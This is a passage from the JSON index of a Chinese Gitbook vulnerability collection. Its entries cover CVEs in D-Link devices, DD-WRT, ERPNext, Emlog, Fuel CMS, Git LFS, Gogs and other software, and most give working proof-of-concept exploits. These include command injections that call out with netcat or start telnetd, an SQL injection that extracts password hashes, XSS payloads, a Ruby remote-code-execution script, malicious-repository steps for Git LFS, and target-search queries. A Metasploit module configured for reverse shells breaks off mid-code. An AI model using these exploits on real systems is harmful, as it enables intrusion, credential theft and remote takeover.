qop=auth, nc=00000035, cnonce=\"bPzBB3mcvSb51Ijx\" Content-Length: 156 Origin: IP Connection: close Referer: http://ip-address:9821/admin/index.html Cookie: user_ip=0.0.0.0; device_mode=router; user_login=admin; device-session-id= {\"jsonrpc\":\"2.0\",\"method\":\"write\",\"params\":{\"id\":166,\"data\":{\"host\":\"'127.0.0.1 & nc SERVER-IP 1234 ref： https://nvd.nist.gov/vuln/detail/CVE-2021-28143 https://github.com/vitorespf/Advisories/blob/master/DLINK-DIR-841-command-injection.txt Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/D-LInk DNS320 FW v2.06B01 命令注入（CVE-2020-25506）.html":{"url":"Edge_Security/D-LInk DNS320 FW v2.06B01 命令注入（CVE-2020-25506）.html","title":"D-LInk DNS320 FW v2.06B01 命令注入（CVE-2020-25506）","keywords":"","body":"D-LInk DNS320 FW v2.06B01 命令注入（CVE-2020-25506） 固件版本为v2.06B01（ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DNS-320/REVA/DNS-320_REVA_FIRMWARE_v2.06B01.zip） 'cgi_ntp_time'函数中存在命令注入。'v6'的值与“（sntp-r％s> / dev / null”）拼接，然后传递到系统中执行 PoC： /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`id` ref： https://nvd.nist.gov/vuln/detail/CVE-2020-25506 https://gist.github.com/WinMin/6f63fd1ae95977e0e2d49bd4b5f00675 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/D-Link DSR-250 DSR-1000N 命令注入（CVE-2020-18568）.html":{"url":"Edge_Security/D-Link DSR-250 DSR-1000N 命令注入（CVE-2020-18568）.html","title":"D-Link DSR-250 DSR-1000N 命令注入（CVE-2020-18568）","keywords":"","body":"D-Link DSR-250 DSR-1000N 命令注入（CVE-2020-18568） 影响版本：DSR-250（3.14）DSR-1000N（2.11B201） 固件包中有一个upnpd程序，该程序在0.0.0.0上侦听端口1900（udp）和49152（tcp）。通过逆向分析，当程序设置iptable时，未检查参数，这可能导致命令注入。 PoC： POST /upnp/control/WANIPConn1 HTTP/1.1 HOST: $control_host:$control_port Content-Length: $content_length Content-Type: text/xml; charset=\"utf-8\" SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping 7331 tcp 1337 1 hackedByC0ss4ck 0.0.0.0 ;telnetd -p 24; ref： https://nvd.nist.gov/vuln/detail/CVE-2020-18568 https://gist.github.com/WinMin/5b2bc43b517503472bb28a298981ed5a Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/DD-WRT 缓冲区溢出漏洞（CVE-2021-27137）.html":{"url":"Edge_Security/DD-WRT 缓冲区溢出漏洞（CVE-2021-27137）.html","title":"DD-WRT 缓冲区溢出漏洞（CVE-2021-27137）","keywords":"","body":"DD-WRT 缓冲区溢出漏洞（CVE-2021-27137） DD-WRT是基于Linux的固件，用于无线路由器和接入点。最初是为Linksys WRT54G系列设计的，现在可在多种型号上运行。 影响版本： DD-WRT 45723 或更低版本 PoC： import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\"*164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1\\r\\n' \\ 'HOST:239.255.255.250:1900\\r\\n' \\ 'ST:uuid:'+payload+'\\r\\n' \\ 'MX:2\\r\\n' \\ 'MAN:\"ssdp:discover\"\\r\\n' \\ '\\r\\n' s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.sendto(packet.encode(), (target_ip, 1900) ) ref： https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Dell BIOS驱动权限提升漏洞（CVE-2021-21551）.html":{"url":"Edge_Security/Dell BIOS驱动权限提升漏洞（CVE-2021-21551）.html","title":"Dell BIOS驱动权限提升漏洞（CVE-2021-21551）","keywords":"","body":"Dell BIOS驱动权限提升漏洞（CVE-2021-21551） 在Dell 的BIOS驱动中由于固件更新程序接受IOCTL（输入输出控制）请求，而没有ACL（访问控制列表），即可以被任意用户调用，通过此方法，造成了任意读取/写入漏洞，如果任意读写可以将当前用户提升至更高权限。 PoC：https://github.com/waldo-irc/CVE-2021-21551 Metasploit Exploit：https://github.com/rapid7/metasploit-framework/pull/15190 https://github.com/zeroSteiner/metasploit-framework/blob/feat/cve-2021-21551/modules/exploits/windows/local/cve_2021_21551_dbutil_memmove.rb use exploit/windows/local/cve_2021_21551_dbutil_memmove 设置SESSION和PAYLOAD run ref： https://github.com/rapid7/metasploit-framework/pull/15190 https://nvd.nist.gov/vuln/detail/CVE-2021-21551 https://github.com/waldo-irc/CVE-2021-21551 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Discuz 3.4 最新版后台getshell.html":{"url":"Edge_Security/Discuz 3.4 最新版后台getshell.html","title":"Discuz 3.4 最新版后台getshell","keywords":"","body":"Discuz 3.4 最新版后台getshell 详情可以看这篇文章：https://www.secpulse.com/archives/125869.html 最新版下载地址：https://gitee.com/Discuz/DiscuzX 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } ?> ref： https://forum.ywhack.com/thread-115312-1-8.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Docker 容器逃逸漏洞（CVE-2020-15257）.html":{"url":"Edge_Security/Docker 容器逃逸漏洞（CVE-2020-15257）.html","title":"Docker 容器逃逸漏洞（CVE-2020-15257）","keywords":"","body":"Docker 容器逃逸漏洞（CVE-2020-15257） 漏洞原理、基础知识请阅读以下链接，不再展开： https://medium.com/nttlabs/dont-use-host-network-namespace-f548aeeef575 或者中文的： https://mp.weixin.qq.com/s/iNziquZJxcox9453jF8LOg 简要来说，containerd->containerd-shim->runc 的通信模型中，containerd-shim的接口作为abstract unix socket暴露，在docker使用net=host参数启动、与宿主机共享net namespace时，其中的unix socket可以被容器内部访问到，容器中攻击者通过该socket可以通过API控制下游runc进程启动新的恶意镜像，并通过该镜像逃逸。 POC 这个漏洞POC比较简单，只要探测到docker内部有containerd-shim启动的unix socket即可确认。 https://github.com/summershrimp/exploits-open/tree/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257 https://github.com/Xyntax/CDK/releases/tag/0.1.6 来源：https://www.cdxy.me/?p=837 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Emlog v5.3.1 - v6.0.0 后台 RCE（CVE-2021-31737）.html":{"url":"Edge_Security/Emlog v5.3.1 - v6.0.0 后台 RCE（CVE-2021-31737）.html","title":"Emlog v5.3.1 - v6.0.0 后台 RCE（CVE-2021-31737）","keywords":"","body":"Emlog v5.3.1 - v6.0.0 后台 RCE（CVE-2021-31737） 由于在admin/data.php中上传了数据库备份文件，因此emlog v5.3.1和emlog v6.0.0具有远程执行代码漏洞。 影响版本： Emlog v5.3.1 Emlog v6.0.0 PoC： select \"\" into outfile \"/var/www/html/tet1/emlog_6.0.0/src/content/uploadfile/202104/222.php\"; 通过在后台数据-备份数据库进行构造恶意sql语句进行备份上传-getshell ref： https://nvd.nist.gov/vuln/detail/CVE-2021-31737 https://github.com/emlog/emlog/issues/82 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Emlog v6.0.0 ZIP插件GETSHELL（CVE-2020-21585）.html":{"url":"Edge_Security/Emlog v6.0.0 ZIP插件GETSHELL（CVE-2020-21585）.html","title":"Emlog v6.0.0 ZIP插件GETSHELL（CVE-2020-21585）","keywords":"","body":"Emlog v6.0.0 ZIP插件GETSHELL（CVE-2020-21585） emlog v6.0.0中的漏洞允许用户通过zip插件模块上传webshel​​l。 PoC： http://x.x.x.x/emlog/src/admin/plugin.php 编辑一个ZIP包，包含xx/xx.php 访问之：http://127.0.0.1/emlog/src/content/plugins/abc/abc.php ref： https://nvd.nist.gov/vuln/detail/CVE-2020-21585 https://github.com/pwnninja/emlog/issues/1 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/ERPNext 13.0.0-12.18.0 中的SQL注入漏洞.html":{"url":"Edge_Security/ERPNext 13.0.0-12.18.0 中的SQL注入漏洞.html","title":"ERPNext 13.0.0-12.18.0 中的SQL注入漏洞","keywords":"","body":"ERPNext 13.0.0/12.18.0 中的SQL注入漏洞 Trovent Security GmbH 在“frappe.model.db_query.get_list”API参数中发现了一个SQL注入漏洞。在13.0.0版本上，不需要任何特权的Payload就足够了，但是在12.18.0版本上，至少需要“system_user”特权。易受攻击的参数“filters”允许注入SQL语句。攻击者能够查询所有可用的数据库表，以检索用户名，密码哈希或密码重置令牌，然后可以使用这些密码来重置管理员密码。 poc： GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a %20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20'%3b%20do%20sleep(10)&order_by=name&_=1615372773071 HTTP/1.1 Host: erpnext.local User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bcf3 X-Frappe-CMD: X-Frappe-Doctype: Dashboard%20Settings X-Requested-With: XMLHttpRequest Connection: close Referer: http://erpnext.local/app/website Cookie: io=NVosyhHCvV3KdkxNAAi7; sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; system_user=no; full_name=auth%20test%27; user_id=auth%40trovent.io; user_image= ref： https://trovent.io/security-advisory-2103-01 https://seclists.org/oss-sec/2021/q2/121 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/ERPNext 13.0.0-12.18.0 中的多个XSS漏洞.html":{"url":"Edge_Security/ERPNext 13.0.0-12.18.0 中的多个XSS漏洞.html","title":"ERPNext 13.0.0-12.18.0 中的多个XSS漏洞","keywords":"","body":"ERPNext 13.0.0/12.18.0 中的多个XSS漏洞 Trovent Security GmbH在当前的ERPNext软件版本（13.0.0和12.18.0）中发现了多个跨站点脚本漏洞。攻击者可能利用此攻击来窃取会话cookie，安装JavaScript键盘记录程序等。 poc： POST /api/method/frappe.desk.form.utils.add_comment HTTP/1.1 Host: sqlprodtest.local:1080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d875 X-Frappe-CMD: X-Requested-With: XMLHttpRequest Content-Length: 157 Origin: http://sqlprodtest.local:1080 Connection: close Referer: http://sqlprodtest.local:1080/desk Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=;io=Ly9MpKRfK_nrKpurAAAN reference_doctype=User&reference_name=%3cscript%3ealert(1)%3c%2fscript%3e&content=xsstest&comment_email=Administrator RESPONSE (removed the Stack Trace for better readability): HTTP/1.1 417 EXPECTATION FAILED Server: nginx/1.19.7 Date: Thu, 11 Mar 2021 14:23:05 GMT Content-Type: application/json Content-Length: 1894 Connection: close Set-Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; Expires=Sun, 14-Mar-2021 14:23:05 GMT; Path=/ Set-Cookie: system_user=yes; Path=/ Set-Cookie: full_name=Administrator; Path=/ Set-Cookie: user_id=Administrator; Path=/ Set-Cookie: user_image=; Path=/ {\"exc_type\":\"LinkValidationError\",\"exc\":\"[\\\"Traceback (...)]\",\"_server_messages\":\"[\\\"{\\\\\\\"message\\\\\\\": \\\\\\\"Could not find Reference Name: alert(1)\\\\\\\", \\\\\\\"indicator\\\\\\\": \\\\\\\"red\\\\\\\", \\\\\\\"raise_exception\\\\\\\": 1}\\\"]\"} poc： POST /api/method/upload_file HTTP/1.1 Host: sqlprodtest.local:1080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: application/json Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Frappe-CSRF-Token: e6532d5e7bef6360c9646d58e0940e8004820db8704ab3dad1d2d875 Content-Type: multipart/form-data; boundary=---------------------------173872902410009950314171894076 Content-Length: 74566 Origin: http://sqlprodtest.local:1080 Connection: close Referer: http://sqlprodtest.local:1080/desk Cookie: sid=0dfe3b41ff7d0a368a4f28cea4f45ce41b2eadec833c5bc42105355e; system_user=yes; full_name=Administrator; user_id=Administrator; user_image=; io=o0Bglip9YmrzxZj9AAAX -----------------------------173872902410009950314171894076 Content-Disposition: form-data; name=\"file\"; filename=\"user-enum.png\\\" onmouseover=\\\"alert(1234)\\\"\" Content-Type: image/png PNG (...) HTML code snippet from erpnext-server.com/desk#List/File/Home. The user is able to escape the context of the title attribute and add an onmouseover event which triggers the JavaScript: user-enum.png\" onmouseover=\"alert(1234)\" ref： https://trovent.io/security-advisory-2103-02 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/FastAdmin 框架远程代码执行漏洞.html":{"url":"Edge_Security/FastAdmin 框架远程代码执行漏洞.html","title":"FastAdmin 框架远程代码执行漏洞","keywords":"","body":"FastAdmin 框架远程代码执行漏洞 FastAdmin是一款基于ThinkPHP和Bootstrap的极速后台开发框架。FastAdmin框架存在有条件RCE漏洞，当攻击者具有一定用户权限的前提下，可以实现任意文件上传，导致RCE。 FOFA： app=\"FASTADMIN-框架\" || body=\"\\\"uploadurl\\\":\\\"ajax\\/upload\\\"\" || body=\"api.fastadmin.net\" || body=\"\\\"fastadmin\\\":{\\\"usercenter\\\":true\" || body=\"content=\\\"FastAdmin\\\"\" || body=\"cdnurl\\\":\\\"\\\",\\\"version\"|| icon_hash=\"-1036943727\" 详细分析可以见：https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg 条件： 普通用户 chunking = true （开启分片上传功能） 上传头像处post： //传入xx.php POST /index/ajax/upload HTTP/1.1 Host: target ------WebKitFormBoundarybw5c2a2bqlLLOMEU Content-Disposition: form-data; name=\"file\"; filename=\"Xnip2021-04-02_11-05-27.png\" Content-Type: application/octet-stream PNG ... ------WebKitFormBoundarybw5c2a2bqlLLOMEU Content-Disposition: form-data; name=\"chunkid\" xx.php ------WebKitFormBoundarybw5c2a2bqlLLOMEU Content-Disposition: form-data; name=\"chunkindex\" 0 ------WebKitFormBoundarybw5c2a2bqlLLOMEU ref： https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg https://mp.weixin.qq.com/s/XP9t0TkObawMTSb41Z13gw https://nosec.org/home/detail/4713.html https://forum.ywhack.com/thread-115352-1-6.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/FortiLogger-未经身份验证的任意文件上传（CVE-2021-3378）.html":{"url":"Edge_Security/FortiLogger-未经身份验证的任意文件上传（CVE-2021-3378）.html","title":"FortiLogger-未经身份验证的任意文件上传（CVE-2021-3378）","keywords":"","body":"FortiLogger-未经身份验证的任意文件上传（CVE-2021-3378） FortiLogger是一个基于Web的日志记录和报告软件，专门为在Windows操作系统上运行的FortiGate防火墙而设计。它包含即时状态跟踪，日志记录，搜索/过滤，报告和热点等功能。 在“热点设置” 下上传公司徽标时发现了此漏洞http://:5000/config/hotspotsettings)。可以向匿名用户发送没有任何身份验证或会话标头的文件，但POST要求是/Config/SaveUploadedHotspotLogoFile。 文件在C:\\Program Files\\RZK\\Fortilogger\\Web\\Assets\\temp\\hotspot\\img目标logohotspot名称下上传，而没有控制文件扩展名或内容。 漏洞详情：https://erberkan.github.io/2021/cve-2021-3378/ msf exploit:https://github.com/erberkan/fortilogger_arbitrary_fileupload 另外的两个漏洞，信息泄露和无需任何授权即可创建用户，利用脚本可在https://erberkan.github.io/2021/cve-2021-3378/找到。 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Fuel CMS 1.4.1 远程代码执行.html":{"url":"Edge_Security/Fuel CMS 1.4.1 远程代码执行.html","title":"Fuel CMS 1.4.1 远程代码执行","keywords":"","body":"Fuel CMS 1.4.1 远程代码执行 FOFA： \"Fuel CMS\" PoC： /fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B' #!/usr/bin/env ruby require 'httpclient' require 'docopt' # dirty workaround to ignore Max-Age # https://github.com/nahi/httpclient/issues/242#issuecomment-69013932 $VERBOSE = nil doc = #{__FILE__} -h | --help Options: Root URL (base path) including HTTP scheme, port and root folder The system command to execute -h, --help Show this screen Examples: #{__FILE__} http://example.org id #{__FILE__} https://example.org:8443/fuelcms 'cat /etc/passwd' DOCOPT def exploit(client, root_url, cmd) url = root_url + \"/fuel/pages/select/?filter='%2Bpi(print(%24a%3D'system'))%2B%24a('#{cmd}')%2B'\" res = client.get(url) /system(.+?)'], args['']) rescue Docopt::Exit => e puts e.message end ref： https://github.com/nahi/httpclient/issues/242 https://www.exploit-db.com/exploits/49487 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Git <= 2.29.2 Git-LFS-RCE-Exploit-CVE-2020-27955.html":{"url":"Edge_Security/Git <= 2.29.2 Git-LFS-RCE-Exploit-CVE-2020-27955.html","title":"Git <= 2.29.2 Git-LFS-RCE-Exploit-CVE-2020-27955","keywords":"","body":"Git Git是一个免费的开源分布式版本控制系统，旨在快速高效地处理从小型到大型项目的所有事务。Git Git LFS是“用于对大文件进行版本控制的开源Git扩展。 https://git-lfs.github.com/ 官网：https://git-scm.com/ 发现者：Dawid Golunski PoC： 使用以下步骤准备git的git-lfs PoC： Attacker: On a separate linux system (to prevent execution on the localhost on commit): 1. Create a new repository: mkdir git-lfs-RCE-exploit cd git-lfs-RCE-exploit git init 2. Prepare a malicious executable. E.g: git.bat with the following contents: @echo hacked > GITHACKED 3. Add the executable to the repository: git add git.bat 4. Add LFS file entries to the repository. This is necessary to trigger the vulnerable git-lfs submodule when the repository is cloned and processed by the main git process. git lfs track \"*.dat\" git add .gitattributes echo \"git exploit PoC\" > big-bug-lfs-file.dat git add big-bug-lfs-file.dat 5. Commit both the exploit and the lfs files: git commit -a -m \"Big Data, powered by Git LFS & the git-lfs exploit\" 6. Push the changes to the repository: git remote add origin https://github.com/some-user-name/lfspoc git push -u origin master Victim: On windows, run powershell.exe shell and clone the PoC repo: git clone https://github.com/some-user-name/lfspoc . At this point the malicious executable (git.bat) will be downloaded into the repo's directory and automatically executed by the git-lfs submodule without any user interaction. As a result, 'GITHACKED' file should appear in the repo's directory To check, type: dir Alternatively, a demo repository with a plain-text bat file located at https://github.com/ExploitBox/git-lfs-RCE-exploit-CVE-2020-27955.git can be used as follows: C:\\Users\\victim> git clone https://github.com/ExploitBox/git-lfs-RCE-exploit-CVE-2020-27955.git . Cloning into '.'... remote: Enumerating objects: 24, done. remote: Counting objects: 100% (24/24), done. remote: Compressing objects: 100% (15/15), done. remote: Total 24 (delta 5), reused 17 (delta 1), pack-reused 0 Receiving objects: 100% (24/24), done. Resolving deltas: 100% (5/5), done. ... C:\\Users\\victim> type GITHACKED hacked https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html https://forum.ywhack.com/thread-114689-1-5.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Git CLI远程代码执行漏洞（CVE-2020-26233）.html":{"url":"Edge_Security/Git CLI远程代码执行漏洞（CVE-2020-26233）.html","title":"Git CLI远程代码执行漏洞（CVE-2020-26233）","keywords":"","body":"Git CLI远程代码执行漏洞（CVE-2020-26233） src/shared/Microsoft.Git.CredentialManager/CommandContext.cs的代码： 第89行中，将创建一个搜索git.exe的新进程，并将Environment.LocateExecutable('git.exe')作为目录路径参数传递给GitProcess()函数。 利用步骤： a）创建一个新的存储库或将文件添加到现有存储库； b）将Windows可执行文件上传到此存储库，重命名为git.exe； c）等待受害者fork存储库 使用gh repo fork REPOSITORY_NAME --clone frok后触发rce： ref： https://github.com/microsoft/Git-Credential-Manager-Core/security/advisories/GHSA-2gq7-ww4j-3m76 https://wildfire.blazeinfosec.com/attack-of-the-clones-2-git-command-client-remote-code-execution-strikes-back/ https://github.com/microsoft/Git-Credential-Manager-Core/blob/c3a543a1352dba953e027f7a92ee4a94b2293a22/src/shared/Microsoft.Git.CredentialManager/CommandContext.cs#L89-L93 https://forum.ywhack.com/thread-115014-1-1.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Git LFS 远程代码执行漏洞 CVE-2020–27955.html":{"url":"Edge_Security/Git LFS 远程代码执行漏洞 CVE-2020–27955.html","title":"Git LFS 远程代码执行漏洞 CVE-2020–27955","keywords":"","body":"Git LFS 远程代码执行漏洞 CVE-2020–27955 2020年11月5日，在Git扩展之一GIT LFS上发现了一个关键漏洞。此漏洞利用成功会导致目标机器的远程代码执行。 远程代码执行漏洞仅对Windows平台上的Git-LFS（git-lfs）版本 漏洞验证： 在CMD窗口上使用以下命令。如果安装了受影响的git-lfs工具，系统将提示您使用计算器应用程序。 1. mkdir C:\\Windows\\Temp\\poc 2. cd C:\\Windows\\Temp\\poc 3. echo calc.exe > git.cmd 4. git-lfs track 在目标系统上获得RCE 按照以下步骤进行远程代码执行 作为攻击者： 1.在GitHub上创建一个存储库 2. cd /dev/shm 3. git clone https://github.com/attacker/poc.git . 4. echo calc.exe > git.cmd 5. git lfs track “*.dat” 6. echo “Junk” > large.dat 7. git add -A 8. git commit -m “POC” 9. git push -u origin master -f 受害者： 1.git clone https://github.com/attacker/poc.git. PoC视频： https://www.youtube.com/watch?v=WF69X9KEayE 加固建议： 更新并保持 git 版本高于 2.29.2，将 git-lfs 扩展程序保持在 2.12 以上 ref： https://medium.com/bugbountywriteup/git-lfs-exploit-for-remote-code-execution-cve-2020-27955-e8f4786163c3 https://forum.ywhack.com/thread-114744-1-4.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Gitlab Kramdown RCE（CVE-2021-22192）.html":{"url":"Edge_Security/Gitlab Kramdown RCE（CVE-2021-22192）.html","title":"Gitlab Kramdown RCE（CVE-2021-22192）","keywords":"","body":"Gitlab Kramdown RCE（CVE-2021-22192） chen师傅的分析：https://wx.zsxq.com/dweb2/index/group/555848225184 复现步骤可以见：https://hackerone.com/reports/1125425 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Gogs Git Hooks 远程代码执行漏洞（CVE-2020-15867）.html":{"url":"Edge_Security/Gogs Git Hooks 远程代码执行漏洞（CVE-2020-15867）.html","title":"Gogs Git Hooks 远程代码执行漏洞（CVE-2020-15867）","keywords":"","body":"Gogs Git Hooks 远程代码执行漏洞（CVE-2020-15867） Gogs（Go Git Service）是Gogs团队的一个基于Go语言的自助Git托管服务，它支持创建、迁移公开/私有仓库，添加、删除仓库协作者等。 Gogs 0.5.5版本至0.12.2版本 git hook feature 存在操作系统命令注入漏洞，该漏洞源于在允许通过身份验证的远程代码执行。 此模块已在Docker上针对0.12.3版本成功测试。 gogs_git_hooks_rce.rb for metasploit： ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule 'Gogs Git Hooks Remote Code Execution', 'Description' => %q{ This module leverages an insecure setting to get remote code execution on the target OS in the context of the user running Gogs. This is possible when the current user is allowed to create `git hooks`, which is the default for administrative users. For non-administrative users, the permission needs to be specifically granted by an administrator. To achieve code execution, the module authenticates to the Gogs web interface, creates a temporary repository, sets a `post-receive` git hook with the payload and creates a dummy file in the repository. This last action will trigger the git hook and execute the payload. Everything is done through the web interface. No mitigation has been implemented so far (latest stable version is 0.12.3). This module has been tested successfully against version 0.12.3 on docker. Windows version could not be tested since the git hook feature seems to be broken. }, 'Author' => [ 'Podalirius', # Original PoC 'Christophe De La Fuente' # MSF Module ], 'References' => [ ['CVE', '2020-15867'], ['EDB', '49571'], ['URL', 'https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/'], ['URL', 'https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1126-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent/'] ], 'DisclosureDate' => '2020-10-07', 'License' => MSF_LICENSE, 'Platform' => %w[unix linux win], 'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64], 'Privileged' => false, 'Targets' => [ [ 'Unix Command', { 'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Type' => :unix_cmd, 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } } ], [ 'Linux Dropper', { 'Platform' => 'linux', 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :linux_dropper, 'DefaultOptions' => { 'CMDSTAGER::FLAVOR' => :bourne, 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp' } } ], [ 'Windows Command', { 'Platform' => 'win', 'Arch' => ARCH_CMD, 'Type' => :win_cmd, 'DefaultOptions' => { 'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp' } } ], [ 'Windows Dropper', { 'Platform' => 'win', 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :win_dropper, 'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' } } ], ], 'DefaultOptions' => { 'WfsDelay' => 30 }, 'DefaultTarget' => 1, 'Notes' => { 'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION] } ) ) register_options([ Opt::RPORT(3000), OptString.new('TARGETURI', [true, 'Base path', '/']), OptString.new('USERNAME', [true, 'Username to authenticate with']), OptString.new('PASSWORD', [true, 'Password to use']), ]) @need_cleanup = false end def check res = send_request_cgi( 'method' => 'GET', 'uri' => normalize_uri(target_uri.path) ) unless res return CheckCode::Unknown('Target did not respond to check.') end # unless res.body.match(%r{}) return CheckCode::Unsupported('Target does not appear to be running Gogs.') end CheckCode::Appears('Gogs found') end def exploit print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\") print_status(\"Authenticate with \\\"#{datastore['USERNAME']}/#{datastore['PASSWORD']}\\\"\") gogs_login print_good('Logged in') @repo_name = [Faker::App.name, Faker::App.name].join('_').gsub(' ', '_') print_status(\"Create repository \\\"#{@repo_name}\\\"\") gogs_create_repo @need_cleanup = true print_good('Repository created') case target['Type'] when :unix_cmd, :win_cmd execute_command(payload.encoded) when :linux_dropper, :win_dropper execute_cmdstager(background: true, delay: 1) end end def execute_command(cmd, _opts = {}) vprint_status(\"Executing command: #{cmd}\") print_status('Setup post-receive hook with command') gogs_post_receive_hook(cmd) print_good('Git hook setup') print_status('Create a dummy file on the repo to trigger the payload') last_chunk = cmd_list ? cmd == cmd_list.last : true gogs_create_file(last_chunk: last_chunk) print_good(\"File created#{', shell incoming...' if last_chunk}\") end def http_post_request(uri, opts = {}) csrf = opts.delete(:csrf) || get_csrf(uri) timeout = opts.delete(:timeout) || 20 post_data = { _csrf: csrf }.merge(opts) request_hash = { 'method' => 'POST', 'uri' => normalize_uri(datastore['TARGETURI'], uri), 'ctype' => 'application/x-www-form-urlencoded', 'vars_post' => post_data } send_request_cgi(request_hash, timeout) end def get_csrf(uri) vprint_status('Get \"csrf\" value') res = send_request_cgi( 'method' => 'GET', 'uri' => normalize_uri(uri) ) unless res fail_with(Failure::Unreachable, 'Unable to get the CSRF token') end csrf = extract_value(res, '_csrf') vprint_good(\"csrf=#{csrf}\") csrf end def extract_value(res, attr) # # # unless (match = res.body.match(/[^\"]+)\".*>/)) return fail_with(Failure::NotFound, \"\\\"#{attr}\\\" not found in response\") end return match[:value] end def gogs_login res = http_post_request( '/user/login', user_name: datastore['USERNAME'], password: datastore['PASSWORD'] ) unless res fail_with(Failure::Unreachable, 'Unable to reach the login page') end unless res.code == 302 fail_with(Failure::NoAccess, 'Login failed') end nil end def gogs_create_repo uri = normalize_uri(datastore['TARGETURI'], '/repo/create') res = send_request_cgi('method' => 'GET', 'uri' => uri) unless res fail_with(Failure::Unreachable, \"Unable to reach #{uri}\") end vprint_status('Get \"csrf\" and \"user_id\" values') csrf = extract_value(res, '_csrf') vprint_good(\"csrf=#{csrf}\") user_id = extract_value(res, 'user_id') vprint_good(\"user_id=#{user_id}\") res = http_post_request( uri, user_id: user_id, repo_name: @repo_name, private: 'on', description: '', gitignores: '', license: '', readme: 'Default', auto_init: 'on', csrf: csrf ) unless res fail_with(Failure::Unreachable, \"Unable to reach #{uri}\") end unless res.code == 302 fail_with(Failure::UnexpectedReply, 'Create repository failure') end nil end def gogs_post_receive_hook(cmd) uri = normalize_uri(datastore['USERNAME'], @repo_name, '/settings/hooks/git/post-receive') shell = 'GET', 'uri' => uri) unless res fail_with(Failure::Unreachable, \"Unable to reach #{uri}\") end vprint_status('Get \"csrf\" and 